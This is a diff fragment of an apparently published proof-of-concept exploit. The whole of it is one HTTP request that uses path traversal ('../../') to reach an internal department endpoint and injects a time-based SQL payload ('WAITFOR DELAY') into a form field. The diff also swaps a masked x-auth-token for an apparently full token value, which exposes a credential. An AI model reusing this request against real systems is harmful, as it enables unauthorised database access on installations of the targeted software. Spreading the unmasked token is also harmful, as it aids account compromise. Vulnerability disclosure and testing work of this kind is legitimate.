@@ -78,7 +78,7 @@ POC/EXP：
 POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
 Host: 127.0.0.1:8881
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
-x-auth-token: d******************************b
+x-auth-token: d9eaeacd5de1008fd43f737c853dcb
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
 usertable=h00&i9999=1';WAITFOR DELAY '0:0:5'--+
